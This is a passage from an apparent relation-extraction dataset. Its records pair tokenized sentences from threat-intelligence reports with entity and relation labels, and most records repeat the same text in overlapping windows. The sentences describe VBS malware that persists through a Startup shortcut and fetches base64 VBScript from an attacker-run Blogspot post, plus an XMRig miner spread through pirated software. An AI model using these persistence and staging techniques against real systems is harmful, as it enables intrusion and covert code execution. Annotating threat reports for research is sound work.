"to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "VBS", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "VBS file", "pos": [12, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [28, 28], "name": "VBS", "pos": [3, 4], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [39, 39], "name": "shortcut", "pos": [14, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [56, 56], "name": "Stage 2", "pos": [0, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [62, 62], "name": "VBS", "pos": [6, 7], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [65, 65], "name": "endpoint", "pos": [9, 10], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "Stage 3 VBS", "pos": [1, 4], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [78, 78], "name": "content", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [82, 82], "name": "Blogspot blog", "pos": [15, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [86, 86], "name": "blog", "pos": [1, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "VBScript", "pos": [4, 5], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [100, 100], "name": "Stage 3", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "Stage 3", "pos": [0, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [114, 114], "name": "blog 's body", "pos": [11, 14], "index": "14_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [128, 128], "name": "Stage 3", "pos": [0, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [134, 134], "name": "blogpost 's body", "pos": [6, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "VBScript", "pos": [12, 13], "index": "17_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [148, 148], "name": "Blogspot content", "pos": [1, 3], "index": "18_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "ST", "evidence": [2], "h": 4, "t": 6}, {"r": "RF", "evidence": [2], "h": 4, "t": 6}, {"r": "WR", "evidence": [3], "h": 7, "t": 8}, {"r": "RD", "evidence": [3], "h": 7, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "t": 11, "h": 12}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "WR", "evidence": [5, 6, 7], "h": 13, "t": 18}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 15}, {"r": "WR", "evidence": [6], "h": 15, "t": 16}, {"r": "EX", "evidence": [6], "h": 15, "t": 17}]}, {"title": "14_g01-10", "sents": [["The", "Stage", "2", "VBS", "also", "enables", "Stage", "3", "to", "be", "persistent", ",", "creating", "a", "shortcut", "for", "it", "in", "the", "current", "user", "'s", "Startup", "directory", ",", "which", "will", "later", "become", "crucial", "."], ["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "VBS", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "shortcut", "pos": [14, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "Stage 2", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "VBS", "pos": [6, 7], "index": "3_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [40, 40], "name": "endpoint", "pos": [9, 10], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "Stage 3 VBS", "pos": [1, 4], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "content", "pos": [11, 12], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [57, 57], "name": "Blogspot blog", "pos": [15, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [61, 61], "name": "blog", "pos": [1, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [64, 64], "name": "VBScript", "pos": [4, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [75, 75], "name": "Stage 3", "pos": [15, 17], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "Stage 3", "pos": [0, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [89, 89], "name": "blog 's body", "pos": [11, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "Stage 3", "pos": [0, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [109, 109], "name": "blogpost 's body", "pos": [6, 9], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [115, 115], "name": "VBScript", "pos": [12, 13], "index": "15_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [123, 123], "name": "Blogspot content", "pos": [1, 3], "index": "16_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "ST", "evidence": [1], "h": 2, "t": 4}, {"r": "RF", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "RD", "evidence": [2], "h": 5, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "EX", "evidence": [3], "t": 9, "h": 10}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "WR", "evidence": [4, 5, 6], "h": 11, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "WR", "evidence": [5], "h": 13, "t": 14}, {"r": "EX", "evidence": [5], "h": 13, "t": 15}]}, {"title": "14_g01-11", "sents": [["Stage", "2", "sets", "up", "Stage", "3", "VBS", "on", "the", "endpoint", "."], ["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."], ["Modules", "to", "implant", "instrumentors", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Stage 2", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "VBS", "pos": [6, 7], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "endpoint", "pos": [9, 10], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [12, 12], "name": "Stage 3 VBS", "pos": [1, 4], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "content", "pos": [11, 12], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "Blogspot blog", "pos": [15, 17], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [30, 30], "name": "blog", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [33, 33], "name": "VBScript", "pos": [4, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [44, 44], "name": "Stage 3", "pos": [15, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [47, 47], "name": "Stage 3", "pos": [0, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [58, 58], "name": "blog 's body", "pos": [11, 14], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [72, 72], "name": "Stage 3", "pos": [0, 2], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [78, 78], "name": "blogpost 's body", "pos": [6, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "VBScript", "pos": [12, 13], "index": "13_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [92, 92], "name": "Blogspot content", "pos": [1, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [105, 105], "name": "implant instrumentors", "pos": [2, 4], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "RD", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "t": 7, "h": 8}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3, 4, 5], "h": 9, "t": 14}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 9, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 9, "t": 11}, {"r": "WR", "evidence": [4], "h": 11, "t": 12}, {"r": "EX", "evidence": [4], "h": 11, "t": 13}]}, {"title": "14_g01-12", "sents": [["The", "Stage", "3", "VBS", "file", "is", "in", "charge", "of", "downloading", "malevolent", "content", "from", "an", "attacker-crafted", "Blogspot", "blog", "."], ["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."], ["Modules", "to", "implant", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "to", "signal", "successful", "compromise", "of", "the", "victim", "by", "sending", "a", "beacon", "to", "a", "remote", "location", "controlled", "by", "the", "attacker", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "Stage 3 VBS", "pos": [1, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "content", "pos": [11, 12], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "Blogspot blog", "pos": [15, 17], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [19, 19], "name": "blog", "pos": [1, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "VBScript", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [33, 33], "name": "Stage 3", "pos": [15, 17], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [36, 36], "name": "Stage 3", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [47, 47], "name": "blog 's body", "pos": [11, 14], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [61, 61], "name": "Stage 3", "pos": [0, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [67, 67], "name": "blogpost 's body", "pos": [6, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [73, 73], "name": "VBScript", "pos": [12, 13], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [81, 81], "name": "Blogspot content", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [94, 94], "name": "implant instrumentors", "pos": [2, 4], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [105, 105], "name": "VBS code", "pos": [8, 10], "index": "13_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [117, 117], "name": "beacon", "pos": [20, 21], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [120, 120], "name": "remote location", "pos": [23, 25], "index": "15_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "t": 4, "h": 5}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2, 3, 4], "h": 6, "t": 11}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 6, "t": 12}, {"r": "CO", "evidence": [2, 3], "h": 6, "t": 8}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "EX", "evidence": [3], "h": 8, "t": 10}, {"r": "WR", "evidence": [7], "h": 13, "t": 14}, {"r": "ST", "evidence": [7], "h": 13, "t": 15}, {"r": "RF", "evidence": [7], "h": 13, "t": 15}]}, {"title": "14_g01-13", "sents": [["This", "blog", "carries", "a", "VBScript", "encoded", "in", "base64", ",", "which", "is", "decoded", "and", "activated", "by", "Stage", "3", "."], ["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."], ["Modules", "to", "implant", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "to", "signal", "successful", "compromise", "of", "the", "victim", "by", "sending", "a", "beacon", "to", "a", "remote", "location", "controlled", "by", "the", "attacker", "."], ["Decoded", "content", "from", "the", "post", "in", "July", "2021", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "blog", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "VBScript", "pos": [4, 5], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "Stage 3", "pos": [15, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [18, 18], "name": "Stage 3", "pos": [0, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "blog 's body", "pos": [11, 14], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "Stage 3", "pos": [0, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "blogpost 's body", "pos": [6, 9], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [55, 55], "name": "VBScript", "pos": [12, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [63, 63], "name": "Blogspot content", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [76, 76], "name": "implant instrumentors", "pos": [2, 4], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [87, 87], "name": "VBS code", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [99, 99], "name": "beacon", "pos": [20, 21], "index": "11_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [102, 102], "name": "remote location", "pos": [23, 25], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [109, 109], "name": "Decoded content", "pos": [0, 2], "index": "13_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 3, "t": 8}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 3, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 5}, {"r": "WR", "evidence": [2], "h": 5, "t": 6}, {"r": "EX", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [6], "h": 10, "t": 11}, {"r": "ST", "evidence": [6], "h": 10, "t": 12}, {"r": "RF", "evidence": [6], "h": 10, "t": 12}]}, {"title": "14_g01-14", "sents": [["Stage", "3", "scans", "the", "blog", "for", "specific", "tags", "to", "identify", "the", "blog", "'s", "body", ",", "which", "is", "then", "decoded", "and", "run", "on", "the", "endpoint", ":"], ["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."], ["Modules", "to", "implant", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "to", "signal", "successful", "compromise", "of", "the", "victim", "by", "sending", "a", "beacon", "to", "a", "remote", "location", "controlled", "by", "the", "attacker", "."], ["Decoded", "content", "from", "the", "post", "in", "July", "2021", "."], ["The", "Stage", "3", "VBS", "scripts", "are", "programmed", "to", "execute", "when", "Startup", "(", "via", "the", "LNK", "in", "the", "Startup", "directory", "installed", "by", "Stage", "2", "scripts", ")", "is", "launched", "when", "the", "victim", "reboots", "or", "logs", "back", "into", "their", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Stage 3", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "blog 's body", "pos": [11, 14], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [25, 25], "name": "Stage 3", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "blogpost 's body", "pos": [6, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "VBScript", "pos": [12, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [45, 45], "name": "Blogspot content", "pos": [1, 3], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [58, 58], "name": "implant instrumentors", "pos": [2, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [69, 69], "name": "VBS code", "pos": [8, 10], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [81, 81], "name": "beacon", "pos": [20, 21], "index": "8_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [84, 84], "name": "remote location", "pos": [23, 25], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [91, 91], "name": "Decoded content", "pos": [0, 2], "index": "10_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [103, 103], "name": "VBS scripts", "pos": [3, 5], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [114, 114], "name": "LNK", "pos": [14, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [121, 121], "name": "Stage 2 scripts", "pos": [21, 24], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [5], "h": 7, "t": 8}, {"r": "ST", "evidence": [5], "h": 7, "t": 9}, {"r": "RF", "evidence": [5], "h": 7, "t": 9}, {"r": "WR", "evidence": [7], "t": 12, "h": 13}, {"r": "WR", "evidence": [6, 7], "t": 10, "h": 13}, {"r": "WR", "evidence": [7], "t": 11, "h": 13}]}, {"title": "14_g01-15", "sents": [["Stage", "3", "downloads", "and", "scans", "the", "blogpost", "'s", "body", "for", "the", "next", "VBScript", "to", "launch", "on", "the", "endpoint", "."], ["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."], ["Modules", "to", "implant", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "to", "signal", "successful", "compromise", "of", "the", "victim", "by", "sending", "a", "beacon", "to", "a", "remote", "location", "controlled", "by", "the", "attacker", "."], ["Decoded", "content", "from", "the", "post", "in", "July", "2021", "."], ["The", "Stage", "3", "VBS", "scripts", "are", "programmed", "to", "execute", "when", "Startup", "(", "via", "the", "LNK", "in", "the", "Startup", "directory", "installed", "by", "Stage", "2", "scripts", ")", "is", "launched", "when", "the", "victim", "reboots", "or", "logs", "back", "into", "their", "system", "."], ["As", "a", "result", ",", "every", "time", "the", "victim", "relogs", "into", "the", "infected", "endpoint", ",", "the", "Stage", "3", "VBScript", "queries", "the", "malicious", "Blogspot", "location", "for", "content", "to", "run", "on", "the", "victim", "'s", "system", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Stage 3", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [6, 6], "name": "blogpost 's body", "pos": [6, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "VBScript", "pos": [12, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [20, 20], "name": "Blogspot content", "pos": [1, 3], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [33, 33], "name": "implant instrumentors", "pos": [2, 4], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [44, 44], "name": "VBS code", "pos": [8, 10], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [56, 56], "name": "beacon", "pos": [20, 21], "index": "6_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [59, 59], "name": "remote location", "pos": [23, 25], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [66, 66], "name": "Decoded content", "pos": [0, 2], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [78, 78], "name": "VBS scripts", "pos": [3, 5], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [89, 89], "name": "LNK", "pos": [14, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [96, 96], "name": "Stage 2 scripts", "pos": [21, 24], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [128, 128], "name": "Stage 3 VBScript", "pos": [15, 18], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [134, 134], "name": "Blogspot location", "pos": [21, 23], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "EX", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [4], "h": 5, "t": 6}, {"r": "ST", "evidence": [4], "h": 5, "t": 7}, {"r": "RF", "evidence": [4], "h": 5, "t": 7}, {"r": "WR", "evidence": [6], "t": 10, "h": 11}, {"r": "WR", "evidence": [5, 6], "t": 8, "h": 11}, {"r": "WR", "evidence": [6], "t": 9, "h": 11}, {"r": "RD", "evidence": [7], "h": 12, "t": 13}]}, {"title": "14_g01-16", "sents": [["Malicious", "Blogspot", "content", "-", "Post-compromise", "activities"], ["Scripts", "to", "establish", "initial", "communication", "."], ["Modules", "to", "implant", "instrumentors", "."], ["Usually", ",", "the", "blog", "'s", "post", "body", "contains", "VBS", "code", "to", "signal", "successful", "compromise", "of", "the", "victim", "by", "sending", "a", "beacon", "to", "a", "remote", "location", "controlled", "by", "the", "attacker", "."], ["Decoded", "content", "from", "the", "post", "in", "July", "2021", "."], ["The", "Stage", "3", "VBS", "scripts", "are", "programmed", "to", "execute", "when", "Startup", "(", "via", "the", "LNK", "in", "the", "Startup", "directory", "installed", "by", "Stage", "2", "scripts", ")", "is", "launched", "when", "the", "victim", "reboots", "or", "logs", "back", "into", "their", "system", "."], ["As", "a", "result", ",", "every", "time", "the", "victim", "relogs", "into", "the", "infected", "endpoint", ",", "the", "Stage", "3", "VBScript", "queries", "the", "malicious", "Blogspot", "location", "for", "content", "to", "run", "on", "the", "victim", "'s", "system", "."], ["This", "gives", "attackers", "sufficient", "time", "to", "alter", "the", "content", "of", "the", "blog", "post", "with", "new", "malicious", "content", "that", "can", "be", "executed", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "Blogspot content", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [14, 14], "name": "implant instrumentors", "pos": [2, 4], "index": "1_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [25, 25], "name": "VBS code", "pos": [8, 10], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [37, 37], "name": "beacon", "pos": [20, 21], "index": "3_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [40, 40], "name": "remote location", "pos": [23, 25], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [47, 47], "name": "Decoded content", "pos": [0, 2], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [59, 59], "name": "VBS scripts", "pos": [3, 5], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [70, 70], "name": "LNK", "pos": [14, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [77, 77], "name": "Stage 2 scripts", "pos": [21, 24], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [109, 109], "name": "Stage 3 VBScript", "pos": [15, 18], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [115, 115], "name": "Blogspot location", "pos": [21, 23], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [129, 129], "name": "attackers", "pos": [2, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [135, 135], "name": "content", "pos": [8, 9], "index": "12_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [141, 141], "name": "new malicious content", "pos": [14, 17], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [3], "h": 2, "t": 3}, {"r": "ST", "evidence": [3], "h": 2, "t": 4}, {"r": "RF", "evidence": [3], "h": 2, "t": 4}, {"r": "WR", "evidence": [5], "t": 7, "h": 8}, {"r": "WR", "evidence": [4, 5], "t": 5, "h": 8}, {"r": "WR", "evidence": [5], "t": 6, "h": 8}, {"r": "RD", "evidence": [6], "h": 9, "t": 10}, {"r": "UK", "evidence": [3, 4, 5, 6, 7], "t": 2, "h": 11}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "EX", "evidence": [7], "h": 11, "t": 13}]}, {"title": "647-0", "sents": [["For", "example", ",", "blocking", "the", "URIs", "used", "by", "the", "mining", "pools", "and", "the", "malware", "'s", "intermediate", "stages", "."], ["Detection", "signatures", "can", "also", "prevent", "the", "XMRig", "miner", "from", "being", "dropped", "and", "executed", "on", "targeted", "hosts", "."], ["Once", "the", "initial", "infection", "was", "completed", "``", "Vivin", "''", "quickly", "moved", "to", "common", "Windows", "tools", "."], ["Initial", "infection", "occurs", "through", "the", "execution", "of", "malware", "made", "to", "resemble", "commonly", "used", "productivity", "software", ",", "tools", ",", "and", "games", "."], ["The", "pirated", "software", "from", "our", "observed", "sample", "run", "contains", "a", "second", "stage", "payload", "that", "is", "written", "to", "\\AppData\\Local\\Temp", "as", "``", "setup.exe.", "``"], 